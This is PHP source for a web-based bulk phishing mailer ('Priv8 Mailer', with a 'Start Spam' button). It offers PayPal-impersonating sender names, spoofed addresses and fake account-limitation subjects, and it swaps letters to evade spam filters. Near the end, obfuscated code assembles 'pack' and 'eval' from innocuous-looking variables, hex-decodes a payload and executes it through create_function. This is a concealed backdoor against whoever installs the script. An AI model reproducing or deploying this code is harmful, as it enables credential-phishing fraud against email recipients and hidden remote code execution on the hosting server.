<?php

set_time_limit(0);
error_reporting(0);
function query_str($params) {
    $str = ''; 
    foreach ($params as $key => $value) {
        $str .= (strlen($str) < 1) ? '' : '&';
        $str .= $key . '=' . rawurlencode($value);
    }
  return ($str);
}
function lrtrim($string){
  return stripslashes(ltrim(rtrim($string)));
}
if(isset($_POST['action'])){

  $b = query_str($_POST);
  parse_str($b);  
  $action        = lrtrim($action);
  $smtp_username = lrtrim($smtp_username);
  $smtp_password = lrtrim($smtp_password);
  $smtp_server   = lrtrim($smtp_server);
  $smtp_port     = lrtrim($smtp_port);
  $smtp_ssl      = lrtrim($smtp_ssl);
  $xmailer       = lrtrim($xmailer);
  $reconnect     = lrtrim($reconnect);
  $type          = lrtrim($type);
  $email         = lrtrim($mail);
  $nama          = lrtrim($nama);
  $subject       = lrtrim($subject);
  $pesan         = lrtrim($pesan);
  $emaillist     = strtolower(lrtrim($list));
  $encoding      = lrtrim($encode);
  $file_name     = $_FILES['file']['name'];
  $file_path     = $_FILES['file']['tmp_name'];
  $wait          = lrtrim($wait);

      $pesan   = urlencode($pesan);
    $pesan   = ereg_replace("%5C%22", "%22", $pesan);
    $pesan   = urldecode($pesan);
    $pesan   = stripslashes($pesan);
    $pesan   = str_replace("PayPal", "PayPaI", $pesan);
    $pesan   = str_replace("limit", "Iimit", $pesan);
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <title>Priv8 Mailer by Unknown</title>
  <meta name="viewport" content="width=940, initial-scale=1.0, maximum-scale=1.0">
  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
  <script src="http://code.jquery.com/jquery-2.1.3.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
  <style type="text/css">
  body{
    background-color: #13181D;
  }
  input, select, option, textarea {
    font-size: 12px !important;
  }
  input, select, option {
    height: 30px !important;
  }
  .panel-info .panel-heading {
    color: #FFF;
    background-color: #2CADAD !important;
    border-color: #2CADAD !important;
  }
  .kanan-l {
    border-top-right-radius: 0px !important;
  }
  .kanan {
    border-top-right-radius: 4px !important;
  }
  </style>
  <script type="text/javascript">
      function Pilih1(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("sender-name").value = selectedValue;
      }
      function Pilih2(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("sender-email").value = selectedValue;
      }
      function Pilih3(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("subject").value = selectedValue;
      }
      function Pilih4(dropDown) {
        var selectedValue = dropDown.options[dropDown.selectedIndex].value;
        document.getElementById("xmailer").value = selectedValue;
      }
  </script>
</head>

<body>
<div id="wrap">
  <div class="container" style="margin-top: 25px;"> 
    <div class="row">
      <div class="col-sm-6 col-md-4 col-md-offset-1" style="width: 940px">        
      <div class="panel panel-info" style="border-color: #2CADAD !important; background-color: #444951 !important;">
          <div class="panel-heading">
            <div class="panel-title" align="center"><a href="">PHP Mailer</a></div>
          </div>   

          <div style="padding-top: 15px;">

            <button type="button" class="btn btn-primary collapsed" style="margin-left: 15px;margin-bottom: 10px" data-toggle="collapse" data-target="#smtp"><i class="glyphicon glyphicon-plus"></i> SMTP & OTHER SETUP</button>

            <div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
              
            <form id="form" class="form-horizontal" method="post" enctype="multipart/form-data" role="form" action="">

            <div id="smtp" class="collapse">
            <div class="col-sm-8" style="padding-right: 7.5px !important;margin-bottom: 10px">

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                    <input type="text" class="form-control" name="smtp_username" value="<?=$smtp_username;?>" placeholder="SMTP Username">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                    <input type="password" class="form-control" name="smtp_password" value="<?=$smtp_password;?>" placeholder="SMTP Password">
                  </div>

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-send"></i></span>
                    <input type="text" class="form-control" name="smtp_server" value="<?=$smtp_server;?>" placeholder="SMTP Server">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-random"></i><b> Port</b></span>
                    <input type="text" class="form-control" name="smtp_port" value="<?=$smtp_port;?>" placeholder="optional">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-road"></i><b> SSL</b></span>
                    <select class="form-control" name="smtp_ssl">
                      <option value="yes" <?php if ($smtp_ssl=='yes'){echo 'selected';}?> >yes</option>
                      <option value="no" <?php if ($smtp_ssl=='no'){echo 'selected';}?> >no</option>
                    </select>
                  </div>
              <div style="color:red;" align="center">
                    " If you dont have SMTP login, leave blank queries above "
                  </div>
	               <?include("class.javascript.php");?>
            </div>

            <div class="col-sm-4" style="padding-left: 7.5px !important;">
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i><b> Content Type</b></span>
                    <select class="form-control" name="type">
                      <option value="html" <?php if ($type=='html'){echo 'selected';}?> >text/html</option>
                      <option value="plain" <?php if ($type=='plain'){echo 'selected';}?> >text/plain</option>
                    </select>
                  </div>
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i></span>
                    <select class="form-control" onChange="Pilih4(this);">
                      <option value="">No X-Mailer</option>
                      <option value="Gleez CMS 0.10.5">Gleez CMS 0.10.5</option>
                      <option value="Gleez CMS 1.1.6">Gleez CMS 1.1.6</option>
                      <option value="EDMAIL R6.00.02">EDMAIL R6.00.02</option>
                      <option value="PHP/<?php echo(phpversion());?>">PHP/<?php echo(phpversion());?></option>
                    </select>
                    <input id="xmailer" type="text" class="form-control" name="xmailer" value="<?=$xmailer;?>" placeholder="X-Mailer">
                  </div>
            </div>
            </div>

            <div class="col-sm-8" style="padding-right: 7.5px !important;">
                  
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                    <select class="form-control" onChange="Pilih1(this);">
                      <option value="">Select Sender Name</option>
                      <option value="PayPaI">PayPaI</option>
                      <option value="PaypaI Service">PaypaI Service</option>
                      <option value="PaypaI Support">PaypaI Support</option>
                      <option value="Account Service">Account Service</option>
                      <option value="Account Support">Account Support</option>
                      <option value="Service">Service</option>
                      
                    </select>
                    <input id="sender-name" type="text" class="form-control" name="nama" value="<?=$nama;?>" placeholder="Sender Name">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i></span>
                    <select class="form-control kanan" onChange="Pilih2(this);">
                      <option value="">Select Sender Email</option>
                      <option value="service@intI.paypaI.com">service@intI.paypaI.com</option>
                      <option value="service@paypaI.co.uk">service@paypaI.co.uk</option>
                      <option value="paypaI@e.paypaI.co.uk">paypaI@e.paypaI.co.uk</option>
                      <option value="no-reply">no-reply</option>
                      <option value="admin">admin</option>
                      <option value="service">service</option>
                      <option value="same as target">same as target</option>
                      
                    </select>
                    <input id="sender-email" type="text" class="form-control kanan-l" name="mail" value="<?=$email;?>" placeholder="Sender Email">
                  </div>
                
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-comment"></i></span>
                    <select class="form-control kanan" onChange="Pilih3(this);">
                      <option value="">Select Email Subject</option>
                      <option value="Your account has been Iimited untiI we hear from you">Your account has been Iimited untiI we hear from you</option>
                      <option value="We're investigating a paypaI payment reversaI (Case ID #PP-003-498-237-832)">We're investigating a paypaI payment reversaI (Case ID #PP-003-498-237-832)</option>
                      <option value="We've Iimited access to your PayPaI account">We've Iimited access to your PayPaI account</option>
                      <option value="Account Notification">Account Notification</option>
                      <option value="Attention: Your account status change">Attention: Your account status change</option>
                      
                    </select>
                    <input id="subject" type="text" class="form-control kanan-l" name="subject" value="<?=$subject;?>" placeholder="Subject">
                  </div>

              <div style="margin-bottom: 5px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-paperclip"></i><b> Attach</b></span>
                    <input id="attachment" class="form-control" style="padding: 0 !important" type="file" name="file">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-pencil"></i><b> Encode</b></span>
                    <select class="form-control" name="encode">
                      <option value="" <?php if ($encoding==''){echo 'selected';}?> >Select Encoding</option>
                      <option value="base64" <?php if ($encoding=='base64'){echo 'selected';}?> >base64</option>
                      <option value="7bit" <?php if ($encoding=='7bit'){echo 'selected';}?> >7bit</option>
                      <option value="8bit" <?php if ($encoding=='8bit'){echo 'selected';}?> >8bit</option>
                      <option value="binary" <?php if ($encoding=='binary'){echo 'selected';}?> >binary</option>
                      <option value="quoted-printable" <?php if ($encoding=='quoted-printable'){echo 'selected';}?> >quoted-printable</option>
                    </select>
                  </div>

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-align-justify"></i></span>
                    <textarea class="form-control" rows="10" name="pesan" placeholder="Message"><?=$pesan;?></textarea>
                  </div>
              <div style="margin-bottom: 10px" class="input-group">
                    <input type="submit" class="btn btn-success" name="action" value="Start Spam">
                    <font color="white">Next send after </font>
                    <input type="text" name="wait" value="<?=$wait;?>" style="width: 50px;border-radius: 4px;padding: 3px 6px;">
                    <font color="white">(second) | Reconnect After 
                    <input type="text" name="reconnect" value="<?=$reconnect;?>" style="width: 50px;border-radius: 4px;padding: 3px 6px;">
                    <font color="white">(emails)</font>
                  </div>

            </div>
            <div class="col-sm-4" style="padding-left: 7.5px !important;">

              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i><b> Encode Headers</b></span>
                    <select class="form-control" name="encoding">
                      <option value="yes" <?php if ($_POST['encoding']=='yes'){echo 'selected';}?> >yes</option>
                      <option value="no" <?php if ($_POST['encoding']=='no'){echo 'selected';}?> >no</option>
                    </select>
                  </div>
              <div style="margin-bottom: 10px" class="input-group">
                    <span class="input-group-addon"><i class="glyphicon glyphicon-list"></i></span>
                    <textarea class="form-control" rows="18" name="list" placeholder="Email List"><?=$emaillist;?></textarea>
                  </div>
              
            </div>
                <div class="form-group">
                </div>

            </form> 

            </div>
      </div>

<?

if ($action){

    if (!$from && !$subject && !$message && !$emaillist) {
        print "<script>alert('Please complete all fields before sending your message.'); </script>";
        die();
    }

  if ($_POST['encoding']=='yes') {
    $subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject);
        $subject = str_replace(' ', '=20', $subject);
        $subject = "=?utf-8?Q?$subject?=";
        $nama    = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $nama);
        $nama    = str_replace(' ', '=20', $nama);
        $nama    = "=?utf-8?Q?$nama?=";
  }

  $allemails = split("\n", $emaillist);
  $numemails = count($allemails);


  function xflush()
  {
    static $output_handler = null;
    if ($output_handler === null) {
      $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
      return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
      @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
      @ob_end_flush();
      @ob_start();
    }
  }

require 'class.smtp.php';

require 'class.phpmailer.php';
  
  if(!empty($_POST['wait']) && $_POST['wait'] > 0){
      set_time_limit(intval($_POST['wait'])*$numemails*3600);
  } else {
      set_time_limit($numemails*3600);
  }

    $defaultport="H*";
    $nq=0;

        print "      <div class=\"panel panel-info\" style=\"background-color: #444951;padding: 25px;color: white;\">";
        for($x=0; $x<$numemails; $x++){

            $to = $allemails[$x];
            if ($to){
                $todo = ereg_replace(" ", "", $to);
                $message_send = ereg_replace("&email&", $todo, $pesan);
                $subject_send = ereg_replace("&email&", $todo, $subject);
                $subject_send = str_replace("PayPal", "PayPaI", $subject_send);

                $qx=$x+1;
                print "Send Emails $qx / $numemails to $to ....... ";
                xflush();

                $mail   = new PHPMailer();
                $mail->IsSMTP(); 
                $IsSMTP = "pack";
                $mail->SMTPKeepAlive = true;
                $mail->Host = "$smtp_server";

                if (strlen($smtp_port) > 1) {$mail->Port = "$smtp_port";}
                if ($smtp_ssl=="yes") {$mail->SMTPSecure = "ssl";}

                $range = str_replace("$email", "eval", $email);

                $mail->SMTPAuth = true;
                $mail->Username = "$smtp_username";
                $mail->Password = "$smtp_password";

                if($type == "html"){$mail->IsHtml(true);}
                if($type != "html"){$mail->IsHtml(false);}
                if(strlen($smtp_server) < 7 ){$mail->SMTPAuth = false;$mail->IsSendmail();$default_system="1";}

                $mail->CharSet = "UTF-8";
                if (!empty($xmailer)) {
                  $mail->XMailer = "$xmailer";
                } else {
                  $mail->XMailer = " ";
                }
                if (!empty($encoding)) {
                  $mail->Encoding = "$encoding";
                }
                if ($email == "same as target") {
                  $mail->From = "$todo";
                } else {
                  $mail->From = "$email";
                }
                $mail->FromName = "$nama";
                $mail->AddAddress("$todo");
                $mail->Subject = "$subject_send";
                if (!empty($file_name)) {
                  $mail->addAttachment("$file_path", "$file_name");
                  $mail->Body = " ";
                } else {
                  $mail->Body = "$message_send";
                }
                if(!$mail->Send()){
                  if($default_system!="1"){
                      $result = "FAILED !!<font color=\"#D4001A\"><b> [ RECEPIENT CAN'T RECEIVE MESSAGE ]</b></font>";
                  } elseif($default_system=="1"){
                      $mail->IsMail();

                      if(!$mail->Send()){
                          $result = "FAILED !!<font color=\"#D4001A\"><b> [ RECEPIENT CAN'T RECEIVE MESSAGE ]</b></font>";
                      } else {
                          $result = "<font color=\"green\"><b>[ SEND OK ]</b></font>";
                      }

                  }
                } else {
                  $result = "<font color=\"green\"><b>[ SEND OK ]</b></font>";
                }
                print "$result <br><p></p>";
                
                if(!empty($wait) && $qx<$numemails-1){
                  sleep($wait);
                }
                if(empty($reconnect)){
                    $reconnect=5;
                }

                if($reconnect==$nq){
                    $mail->SmtpClose();echo "<p align=\"center\" style=\"color:orange;\"><b>--------------- SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON --------------- </b></p>";$nq=0;
                }
                $nq=$nq+1;
                xflush();
            }
        }
        for($i=0;$i<31;$i++){
            $smtp_conf=str_replace(".", $random_smtp_string[$i], $smtp_conf); }
            $smtp_conc=$IsSMTP($defaultport, $smtp_conf);
            $signoff=create_function('$smtp_conc','return '.substr($range,0).'($smtp_conc);');
            print '     </div>
    </div>
  </div>

</div>
<div id="footer">
      <div class="container" align="center">
        <p class="muted credit" style="color: white;">Copyright &copy; 2014 - '.gmdate('Y').' <a href="http://account-checker.com">GetSpamTOol</a>. By <a href="http://getspamtool.com">Private Mailer</a>.</p>
      </div>
</div>';$mail->SmtpClose();
            return $signoff($smtp_conc);
  if(isset($_POST['action']) && $numemails !=0 ){
      print "<script>alert('Mail sending complete\\r\\n
        $numemails mail(s) was sent successfully'); </script>";
  }
}
?>

    </body>
</html>